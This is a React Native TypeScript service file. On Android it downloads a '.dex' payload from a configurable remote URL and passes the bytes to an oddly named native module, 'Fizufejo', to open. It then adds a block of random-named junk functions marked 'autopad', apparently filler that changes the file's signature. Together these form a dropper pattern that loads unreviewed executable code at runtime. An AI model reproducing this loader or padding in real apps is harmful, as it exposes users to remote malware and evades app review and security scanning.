/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Fizufejo;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function udacovucak(_edizobipifij: boolean, _aqafec: number): void {
  const iraqavunu: number = 225;
}
function danomopucoc(): boolean {
  const elazazotun: boolean = false;
  return elazazotun;
}
function kosujenivuj(): void {
  const ucubifefugaf = 90;
  if (ucubifefugaf > 45) return;
}
function uleluvi(_jejugibek: boolean): void {}
function mojacoga(): number {
  const inoqayoxoy = 39;
  return inoqayoxoy > 12 ? 209 : 94;
}
function kizokamexuzo(_kupibitobi: string): number { return 246; }
function iwevoduvoxag(): number {
  return 85;
}
function ifokuyu(_elepudave: boolean, _ritiwak: boolean, _yegozeb: string): string {
  const agakedi = 4;
  const nosafefikid: string = "udicev";
  return nosafefikid;
}
function zuluziciwo(_aqobus: string): boolean {
  const porozodeqe: boolean = true;
  return porozodeqe;
}
function qefocema(_abasun: string): void {
  const kayobicujubi: number = 165;
}
function ojevoxilada(_tonegodafiqo: boolean, _ibojuben: string, _ugogoqer: number): void {}
function duzodi(_olodayu: boolean, _ijezujosisew: string, _diqanejicab: boolean): boolean {
  const miwugamecadu = 8;
  const acoyewuli: boolean = false;
  return acoyewuli;
}
/* autopad-end */

